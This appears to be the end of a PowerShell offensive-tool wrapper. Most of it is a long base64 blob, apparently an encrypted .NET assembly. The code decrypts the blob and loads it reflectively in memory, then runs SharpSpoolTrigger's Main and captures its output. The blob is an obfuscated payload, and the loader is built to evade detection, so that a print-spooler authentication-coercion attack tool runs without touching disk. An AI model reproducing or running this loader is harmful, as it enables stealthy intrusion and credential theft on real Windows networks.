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"
    $y = [System.Convert]::FromBase64String($y)
    $x = [System.Convert]::ToBase64String((Decrypt-Bytes $key $iv $y))
    Write-Host $x.substring(0,10)
    [System.Reflection.Assembly]::Load([System.Convert]::FromBase64String($x))

    $OldConsoleOut = [Console]::Out
    $StringWriter = New-Object IO.StringWriter
    [Console]::SetOut($StringWriter)

    [SharpSpoolTrigger.Program]::Main($args)

    [Console]::SetOut($OldConsoleOut)
    $Results = $StringWriter.ToString()
    $Results
}
